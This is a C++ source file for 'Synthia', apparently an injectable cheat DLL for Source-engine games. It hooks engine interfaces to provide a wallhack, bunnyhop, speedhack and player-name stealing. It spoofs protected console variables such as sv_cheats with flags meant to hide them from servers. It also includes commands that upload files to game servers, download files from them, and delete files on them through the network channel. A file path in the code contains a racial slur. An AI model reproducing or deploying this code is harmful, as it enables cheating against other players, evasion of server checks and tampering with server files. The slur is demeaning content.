#include "synthia.h"

bool Synthia_WallHackBool = false;
bool Synthia_NameStealerBool = false;



using namespace Synthia;


void DumpAll ( ClientClass *pClass, RecvTable *pTable )
{

	RecvProp *pProp = NULL;

	if ( pTable->GetNumProps() < 0 )
		return;

	for( int i = 0; i < pTable->GetNumProps(); i++ )
	{	
		pProp = pTable->GetProp(i);

		if( !pProp )
			continue;
		
		if ( !pProp->GetName() )
			continue;

		WriteLogFile ( formatString("	->%s<-\n", pProp->GetName()).c_str() );

		if ( pProp->GetDataTable() )
			DumpAll ( pClass, pProp->GetDataTable() );
		else
			continue;
	}

}

void DumpAllClasses ( string *parsing )
{
	ClientClass *pClass = Utils::Interfaces::Client->GetAllClasses();

	for( ; pClass; pClass = pClass->m_pNext )
	{
		if ( !pClass->GetName() )
			continue;

		WriteLogFile( pClass->GetName() );

		DumpAll ( pClass, pClass->m_pRecvTable );

		WriteLogFile ( "------------\n" );
	}
}

int Red, Green, Blue, Alpha = 0;


SpewRetval_t NewSpew(SpewType_t Type, const char *pMsg) {
	
	if ( !pMsg || Type == SPEW_ABORT )
	{
		return OldSpew(Type, pMsg);
	}

	/*Color tempColor = GetSpewOutputColor();
	tempColor.GetColor(Red,Green,Blue,Alpha);
	SetConsoleTextAttribute(screen, ?); gotta someone make it except rgba colors.*/
	

	
	Utils::WriteInConsole( pMsg );

	return OldSpew(Type, pMsg);

}


bool Bhop = true;
int Speedhack = 1;

const char *cvarspoofprefix = "";

void Synthia_int_ConVar( ConVar* pCvar, const char* origCvarName, const char* defaultValue, int origFlags)
{

	ConVar* pNewVar = (ConVar*)malloc( sizeof ConVar );

	memcpy( pNewVar, pCvar,sizeof( ConVar ));
	pNewVar->m_pNext = 0;
	g_pCVar->RegisterConCommand( pNewVar );

	pCvar->m_pszName = new char[50];
	
	char tmp[50];
	Q_snprintf(tmp, sizeof(tmp), "_%s_%s", cvarspoofprefix, origCvarName);

	strcpy((char*)pCvar->m_pszName, tmp);

	pCvar->m_nFlags = FCVAR_PROTECTED | FCVAR_DONTRECORD | FCVAR_SERVER_CANNOT_QUERY;

	string spoofedvarname = formatString( "_%s_%s", cvarspoofprefix, origCvarName );

	new ConVar(origCvarName, defaultValue, origFlags, g_pCVar->FindVar( spoofedvarname.c_str() )->GetHelpText() );


	g_pCVar->RegisterConCommand( g_pCVar->FindVar(origCvarName) );
}



void *Synthia_About( string *parsing, const char *args_s )
{
	Utils::WriteInConsole("\n\n\n");
	Utils::WriteInConsole("About Synthia:\n\n");
	Utils::WriteInConsole("Syntha is a Framework of helpful tools for source-games.\n");
	Utils::WriteInConsole("It was created by Leystryku.\n\n");

	Utils::WriteInConsole("Commands:\n\n");
	Utils::WriteInConsole("sa_about - Gives you information about Synthia.\n");
	Utils::WriteInConsole("sa_convar - Enables disabled ConVars.\n");
	Utils::WriteInConsole("sa_name - Allows you to change your name.\n");
	Utils::WriteInConsole("sa_namesteal - Automatic name changer.\n");
	Utils::WriteInConsole("sa_bhop - Allows you to bhop in-game\n");
	Utils::WriteInConsole("sa_wallhack - Self explanatory.\n");
	Utils::WriteInConsole("sa_f_upload - Upload a file\n");
	Utils::WriteInConsole("sa_f_download - Download a file\n");
	Utils::WriteInConsole("sa_f_delete - Delete a file\n");

	Utils::WriteInConsole("\n\n\n");

	return (void*)1;
}

void *Synthia_f_Upload( string *parsing, const char *args_s )
{

    if(!Utils::Interfaces::Engine_cl->IsInGame())
    {
		Warning("Join a server first.\n");
		return (void*)0;
    }
 
    INetChannel *channel = (INetChannel *)Utils::Interfaces::Engine_cl->GetNetChannelInfo();

    channel->SendFile(parsing[1].c_str(), 11);

	return (void*)1;
}

void *Synthia_f_Download( string *parsing, const char *args_s )
{

    if(!Utils::Interfaces::Engine_cl->IsInGame())
    {
		Warning("Join a server first.\n");
		return (void*)0;
	}

    INetChannel *channel = (INetChannel *)Utils::Interfaces::Engine_cl->GetNetChannelInfo();

	channel->RequestFile( parsing[1].c_str() );

	return (void*)1;
}

void *Synthia_f_Delete( string *parsing, const char *args_s )
{

    if(!Utils::Interfaces::Engine_cl->IsInGame())
    {
		Warning("Join a server first.\n");
		return (void*)0;
    }
 
    char DeleteMe[MAX_PATH] = "";

    if(!strstr(parsing[1].c_str(),"/niggercats.txt"))
    {
		strcat(DeleteMe, parsing[1].c_str());
		strcat(DeleteMe,"/niggercats.txt");
    }
    else
    {
		strcat(DeleteMe, parsing[1].c_str());
    }
 
    INetChannel *channel = (INetChannel *)Utils::Interfaces::Engine_cl->GetNetChannelInfo();
    channel->SendFile(DeleteMe, 13);

	return (void*)1;
}

void m_Synthia_ConVar( const char *name )
{

	ConVar* pCvar = g_pCVar->FindVar( name );

	if (!pCvar)
	{
		Utils::WriteInConsole("[Synthia] Could not find cvar %s !\n", name );
		return;
	}

	Synthia_int_ConVar( pCvar, pCvar->GetName(), pCvar->m_pszDefaultValue, pCvar->m_nFlags );

}

void *Synthia_ConVar( string *parsing, const char *args_s )
{

	m_Synthia_ConVar( parsing[1].c_str() );

	return (void*)1;
}

void m_Synthia_Name( const char *name )
{

	if ( !Utils::Interfaces::Engine_cl->IsConnected() )
		return;

	INetChannel *ch = (INetChannel*)Utils::Interfaces::Engine_cl->GetNetChannelInfo();

	char pckBuf[256];
	bf_write pck( pckBuf, sizeof( pckBuf ) );
	

	pck.WriteUBitLong( 5, NET_MESSAGE_BITS );
	pck.WriteByte( 0x01 );
	pck.WriteString( "name" );
	pck.WriteString( name );
	
	ch->SendData( pck );

}

void *Synthia_Name( string *parsing, const char *args_s )
{

	m_Synthia_Name( args_s );

	return (void*)1;
}

void *Synthia_Disconnect( string *parsing, const char *args_s )
{

	if ( !Utils::Interfaces::Engine_cl->IsConnected() )
		return (void*)0;

	INetChannel *ch = (INetChannel*)Utils::Interfaces::Engine_cl->GetNetChannelInfo();

	ch->Shutdown( args_s );

	return (void*)1;
}

void *Synthia_Speedhack( string *parsing, const char *args_s )
{
	int speed = atoi(args_s);

	if ( !speed )
	{
		Utils::WriteInConsole( "You need to enter a number ! ");

		return (void*)1;
	}

	if ( speed == 0 )
	{
		Utils::WriteInConsole( "Speed needs to be higher than 1." );
		
		return(void*)0;
	}

	Speedhack = speed;

	return (void*)1;
}

void *Synthia_Wallhack( string *parsing, const char *args_s )
{
	Synthia_WallHackBool = !Synthia_WallHackBool;

	return (void*)1;
}

bool bIsBadIndex( int iIndex ) 
{
    player_info_s Info; 

    if( iIndex == Utils::Interfaces::Engine_cl->GetLocalPlayer( ) ) 
        return true; 

    if( Utils::Interfaces::Engine_cl->GetPlayerInfo( iIndex, &Info ) == false ) 
        return true; 

    if ( ( Info.fakeplayer ) || ( Info.friendsID == 0 ) ) 
        return true;

    return false; 
} 

void Synthia_NameStealerThread()
{

	if ( !Synthia_NameStealerBool )
		return;

	if ( !Utils::Interfaces::Engine_cl->IsConnected() )
		return;

	if ( !Utils::Interfaces::Engine_cl->GetMaxClients() )
		return;

	int iIndex = ( rand() % Utils::Interfaces::Engine_cl->GetMaxClients() );


    while ( bIsBadIndex(iIndex) == true )
    {

		iIndex = ( rand() % Utils::Interfaces::Engine_cl->GetMaxClients() );

		if ( bIsBadIndex(iIndex) == false )
			break;

    }

    player_info_s pInfo; 

    Utils::Interfaces::Engine_cl->GetPlayerInfo( iIndex, &pInfo ); 

	const char* name = pInfo.name;

	m_Synthia_Name( formatString( " %s", name ).c_str() );

}

void DrawLine( )
{
	/*
	if ( pPlayer == NULL )
		return;

	if ( pPlayer->GetActiveWeapon() == NULL )
		return;

	C_BaseCombatWeapon *pWeapon = pPlayer->GetActiveWeapon();

	if ( pWeapon == NULL )
		return;

	IMaterial *pMaterial = aMaterialSystem->FindMaterial("sprites/laserbeam", "Other textures");

	color32 clr;
	clr.r = 0;
	clr.g = 255;
	clr.b = 0;
	clr.a = 255;

	//if(pMaterial)
		//FX_DrawLine(pWeapon->GetAbsOrigin(), pWeapon->GetAbsOrigin() * 8192, 5, pMaterial, clr);
*/
}

int getOffsetToVariable( char *szClassName, char *szVariable )
{
    ClientClass *pClass = Utils::Interfaces::Client->GetAllClasses();

    for( ; pClass; pClass = pClass->m_pNext )
    {
        RecvTable *pTable = pClass->m_pRecvTable;

        if( pTable->GetNumProps() <= 1 ) continue;

		//gBaseAPI.log( "-- %s", pClass->GetName());
		
        for(int i = 0; i < pTable->GetNumProps(); i++)
        {
            RecvProp *pProp = pTable->GetProp( i );

			pProp->GetDataTable();

			//gBaseAPI.log( "-- --> %s [0x%.8X] [%i]", pProp->GetName(), pProp->GetOffset(), pProp->GetNumElements());

            if( !pProp ) continue;

			

            if((!Q_strcmp( pTable->GetName(), szClassName ) || !Q_strcmp((char *)pTable->m_pNetTableName, szClassName))
                && !Q_strcmp( pProp->GetName(), szVariable ) )
            {
                return pProp->GetOffset();
            }
        }
    }
    return 0;
} 



int m_fFlags = 0;
CInput::CVerifiedUserCmd *verifiedCmd = NULL;

int GetVerifiedUserCmd( signed int sequence_number, bool ret )
{
  int v2;
  int v3;

  v3 = 348 * sequence_number % 90;
  v2 = *(DWORD *)( Utils::Interfaces::Input + 196);

  if ( *(DWORD *)(v2 + v3 + 4) == sequence_number )
  {
	
	if ( !ret )
		return v2;

	return v3 + v2;
  }

  return 0;
}


void __stdcall nCreateMove( int sequence_number, float input_sample_frametime, bool active )
{

	Utils::Hooks::Client->UnHook();
	Utils::Interfaces::Client->CreateMove( sequence_number, input_sample_frametime, active );

	verifiedCmd = NULL;
	
	CUserCmd *cmd = 0;

	if ( GetVerifiedUserCmd( sequence_number, false ) != 0 )
	{
		verifiedCmd = (CInput::CVerifiedUserCmd *)GetVerifiedUserCmd( sequence_number, false );
		verifiedCmd = &verifiedCmd[ sequence_number % 90 ];

		if ( !GetVerifiedUserCmd( sequence_number, true ) )
		{
			Utils::Hooks::Client->ReHook();
			return;
		}

		cmd =  (CUserCmd *)GetVerifiedUserCmd( sequence_number, true );
	}

	if ( !cmd )
	{
		MessageBox( NULL, "no cmd", "a", MB_OK );
		Utils::Hooks::Client->ReHook();
		return;
	}

	if ( !verifiedCmd )
	{
		MessageBox( NULL, "no verifiedCmd", "a", MB_OK );
		Utils::Hooks::Client->ReHook();
		return;
	}

	if ( &verifiedCmd->m_cmd == NULL )
	{
		MessageBox( NULL, "no verifiedCmd->m_cmd", "a", MB_OK );
		Utils::Hooks::Client->ReHook();
		return;
	}

	if ( !Bhop )
	{
		if( !Utils::IsGameOverlayOpen() && ( cmd->buttons & IN_JUMP ) )
		{
			if ( m_fFlags == 0 )
			{
				m_fFlags = Utils::GetNetvarOffset("DT_BasePlayer", "m_fFlags");
			}

			int iFlags = *reinterpret_cast<int*>( reinterpret_cast< DWORD >( Utils::Interfaces::EntList->GetClientEntity( Utils::Interfaces::Engine_cl->GetLocalPlayer() )->GetBaseEntity() ) + m_fFlags );

			if ( iFlags == NULL )
				return;
			
			if( !(iFlags & FL_ONGROUND) )
			{
				cmd->buttons &= ~IN_JUMP;
			}

		}
	}


	verifiedCmd->m_cmd = *cmd;

	MessageBox( NULL, "thxbby", "k", MB_OK);
	Utils::Hooks::Client->ReHook();
}

bool __stdcall nReadFile( const char *pFileName, const char *pPath, CUtlBuffer &buf, int nMaxBytes = 0, int nStartingByte = 0, FSAllocFunc_t pfnAlloc = NULL )
{
	Utils::Hooks::FileSystem->UnHook();
	bool ret = Utils::Interfaces::FileSystem->ReadFile( pFileName, pPath, buf, nMaxBytes, nStartingByte, pfnAlloc );
	Utils::Hooks::FileSystem->ReHook();

	return ret;
}

int __stdcall nReadFile(  const char *pFileName, const char *pPath, void **ppBuf, bool bNullTerminate, bool bOptimalAlloc, int nMaxBytes = 0, int nStartingByte = 0, FSAllocFunc_t pfnAlloc = NULL )
{

	Utils::Hooks::FileSystem->UnHook();
	int ret = Utils::Interfaces::FileSystem->ReadFileEx( pFileName, pPath, ppBuf, bNullTerminate, bOptimalAlloc, nMaxBytes, nStartingByte, pfnAlloc );
	Utils::Hooks::FileSystem->ReHook();

	return ret;
}

int __stdcall nDrawModelEx( ModelRenderInfo_t &pInfo )
{

	if ( pInfo.pModel && Utils::Interfaces::ModelInfo->GetModelName( pInfo.pModel ) )
	{
		MessageBox( NULL, Utils::Interfaces::ModelInfo->GetModelName( pInfo.pModel ), "penis", MB_OK );
		if ( pInfo.entity_index && pInfo.entity_index <= Utils::Interfaces::Engine_cl->GetMaxClients() && !bIsBadIndex(pInfo.entity_index) )
		{
			Utils::Hooks::ModelRender->UnHook();

			float color[3];
			color[0] = 255.0f;
			color[1] = 255.0f;
			color[2] = 255.0f;

			Utils::Interfaces::Render->SetColorModulation( color );
			Utils::Interfaces::Render->SetBlend( 1.0f );
			Utils::Interfaces::Modelrender->DrawModelEx( pInfo );
			Utils::Interfaces::Render->SetBlend( 1.0f );

			Utils::Hooks::ModelRender->ReHook();

			return 1;

			/*
			//flColor[0] = 0;
			//Utils::Interfaces::Render->SetColorModulation( flColor );
			int MaterialCount = 30;
			IMaterial* pMaterial[30];
			

			for(int i=1; i<MaterialCount; ++i)
			{
				
				if ( pMaterial[i] && pMaterial[i]->GetName() )
				{
					if ( pMaterial[i]->GetMaterialVarFlag( MATERIAL_VAR_IGNOREZ ) != Synthia_WallHackBool )
						pMaterial[i]->SetMaterialVarFlag( MATERIAL_VAR_IGNOREZ, Synthia_WallHackBool );

					if ( pMaterial[i]->GetMaterialVarFlag( MATERIAL_VAR_ZNEARER ) != Synthia_WallHackBool )
						pMaterial[i]->SetMaterialVarFlag( MATERIAL_VAR_ZNEARER, Synthia_WallHackBool );
				}
			}*/

		}
	}

	Utils::Hooks::ModelRender->UnHook();
	int ret = Utils::Interfaces::Modelrender->DrawModelEx( pInfo );
	Utils::Hooks::ModelRender->ReHook();

	return ret;
}

UINT oldcp;

void *Synthia_NameSteal( string *parsing, const char *args_s )
{
	Synthia_NameStealerBool = !Synthia_NameStealerBool;

	return (void*)1;
}

void *Synthia_BunnyHop( string *parsing, const char *args_s )
{
	Bhop = !Bhop;

	return (void*)1;
}

int InitializeL( )
{

	Utils::Interfaces::Init();
	
	while( !Utils::Interfaces::bInitiated )
		Sleep( 10 );

	PDWORD *m_pdwModelRender = ( PDWORD* )Utils::Interfaces::get( &Utils::AppSysFactory, "VEngineModel" );
	PDWORD *m_pdwFileSystem = ( PDWORD* )Utils::Interfaces::get( &Utils::AppSysFactory, "VFileSystem" );

	Utils::Hooks::FileSystem = new CVMTHookManager( m_pdwFileSystem );
	Utils::Hooks::FileSystem->dwHookMethod( ( DWORD )nReadFile, 20 );
	Utils::Hooks::FileSystem->dwHookMethod( ( DWORD )nReadFileEx, 20 );

	Utils::Hooks::ModelRender = new CVMTHookManager( m_pdwModelRender );

	//Utils::Hooks::ModelRender->dwHookMethod( ( DWORD )nDrawModelEx, 18 );
	
	ConVar_Register(0);

	
	OldSpew = GetSpewOutputFunc();
	SpewOutputFunc(NewSpew);

	AllocConsole();


	hOut = GetStdHandle( STD_OUTPUT_HANDLE );
	hIn = GetStdHandle( STD_INPUT_HANDLE );
	oldcp = GetConsoleOutputCP();
	SetConsoleOutputCP(CP_UTF8);

	char str [20000];
	str[0] = 80;

	SetConsoleTitle( "Synthia Console" );
	
	Utils::WriteInConsole("Initialized Synthia.\n");
	Utils::WriteInConsole("m_pInput: [0x%x]\n", Utils::Interfaces::Input );
	Utils::WriteInConsole("Spoof prefix: _%s_ \n", cvarspoofprefix);

	m_Synthia_ConVar( "sv_cheats" );
	m_Synthia_ConVar( "r_drawothermodels" );
	m_Synthia_ConVar( "mat_fullbright" );
	m_Synthia_ConVar( "host_timescale" );

	/*
	Command *commands[50];
	int i = 0;


	commands[0]->Create( "sa_about", "sa_about < >", "Tells you everything you need to know about Synthia.", Synthia_About);
	

	commands[1]->Create( "sa_convar", "sa_convar < convar >", "Allows you to spoof convars", Synthia_ConVar);
	commands[2]->Create( "sa_name", "sa_name < name >", "Allows you to change your name", Synthia_Name);
	commands[3]->Create( "sa_namesteal", "sa_namesteal < >", "Randomly changes your name every 20 seconds.", Synthia_NameSteal);
	commands[4]->Create( "sa_disconnect", "sa_disconnect < text >", "Allows you to disconnect with a custom message.", Synthia_Disconnect);
	commands[5]->Create( "sa_wallhack", "sa_wallhack < >", "A toggle-able wallhack.", Synthia_Wallhack );
	commands[6]->Create( "sa_speedhack", "sa_speedhack < speed >", "A simple speedhack. (wip)", Synthia_Speedhack);
	commands[7]->Create( "sa_f_upload", "sa_f_upload < filename >", "Uploads a file to the server.", Synthia_f_Upload);
	commands[8]->Create( "sa_f_download", "sa_f_download < filename >", "Downloads a file from the server.", Synthia_f_Upload);
	commands[9]->Create( "sa_f_delete", "sa_f_delete < filename >", "Deletes a file from the server.", Synthia_f_Upload);

	*/

	while (str != "exit")
	{

		cgets(str);
		
		string nstr = &str[2];

		if ( nstr == "" || nstr == " " )
			continue;

		if ( nstr == "clear" )
		{
			system("cls"); //gotta find a better way
		}

		string parsing[999] = { "a", "b" };

		char astr[] = "";
		char* pch = strtok(str, " ");

		int tmpval = 0;

		while (pch != NULL) {
			parsing[tmpval] = pch;
			parsing[tmpval].erase(0, 2);
			tmpval = tmpval + 1;

			pch = strtok(NULL, " ");
		}
		/*
		if ( strstr(parsing[0].c_str(), "sa_") )
		{
			for ( int i = 0; i < cmdnum; i++)
			{
				if ( strcmp(commands[i]->name, parsing[0].c_str()) == 0 )
				{
					parsing[0].clear();

					string result;

					for ( int ii = 0; ii < 999; ii++)
					{

						if ( !&parsing[ii] )
							break;
		
						result = formatString( "%s%s", result.c_str(), parsing[ii].c_str() );
					}

					commands[i]->func( parsing, result.c_str() );
					continue;
				}
			}
		}
		*/
		Utils::Interfaces::Engine_cl->ClientCmd_Unrestricted(nstr.c_str());
	}

	return 0;

}

int Think()
{
	_sleep(1000);
	Synthia_NameStealerThread();
	Think();

	return 0;

}

DWORD WINAPI thinkthread( LPVOID Param )
{

	Think();

	return 0;
}

int __stdcall nInitShit( CreateInterfaceFn appSysFactory, CreateInterfaceFn physicsFactory, CGlobalVarsBase* pGlobals, IGet *sth )
{

	Utils::Hooks::Client->UnHook();

	int ret = Utils::Interfaces::Client->Init( appSysFactory, physicsFactory, pGlobals, sth );

	//Utils::Hooks::Client->ReHook();

	Utils::AppSysFactory = appSysFactory;
	Utils::pGlobals = pGlobals;

	gGet = sth;

	return ret;
}

void __stdcall nHudUpdate( bool bActive )
{
	Utils::Hooks::Client->UnHook();
	Utils::Interfaces::Client->HudUpdate( bActive );
	Utils::Hooks::Client->ReHook();

}

int Initialize( )
{
	HMODULE hModuleClient = NULL;

	while(!GetModuleHandle("client.dll"))
	{
		Sleep(100);
	}

	hModuleClient = GetModuleHandle("client.dll");

	CreateInterfaceFn ClientFactory	= (CreateInterfaceFn)GetProcAddress(hModuleClient, "CreateInterface");

	if( !ClientFactory )
	{
		MessageBox(NULL, "Could not get a factory !", "Synthia", MB_OK);

		return 0;
	}

	while( !ClientFactory( "VClient017", NULL ) )
		Sleep(10);

	PDWORD* m_pdwClient = ( PDWORD* ) Utils::Interfaces::get( &ClientFactory, "VClient" );

	Utils::Interfaces::Client = ( IBaseClientDLL* ) Utils::Interfaces::get( &ClientFactory, "VClient" );

	Utils::Hooks::Client = new CVMTHookManager( m_pdwClient );
	Utils::Hooks::Client->dwHookMethod( ( DWORD )nInitShit, 0 );
	//Utils::Hooks::Client->dwHookMethod( ( DWORD )nHudUpdate, 11 );
	//Utils::Hooks::Client->dwHookMethod( ( DWORD )nCreateMove, 21 );

	cvarspoofprefix = randomString( 5 );

	while( !Utils::AppSysFactory )
		_sleep(10);

	
	CreateThread(NULL, NULL, thinkthread, NULL, NULL, NULL);
	InitializeL();

	return 0;

}

DWORD WINAPI hookthread( LPVOID Param )
{

	Initialize();

	return 0;
}

BOOL WINAPI DllMain( HMODULE hModule, DWORD reason, LPVOID lpReserved )
{

    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, NULL, hookthread, NULL, NULL, NULL);
        return 1;
    }

    if (reason == DLL_PROCESS_DETACH)
    {
		SetConsoleOutputCP(oldcp);
        return 1;
    }

    return 0;
}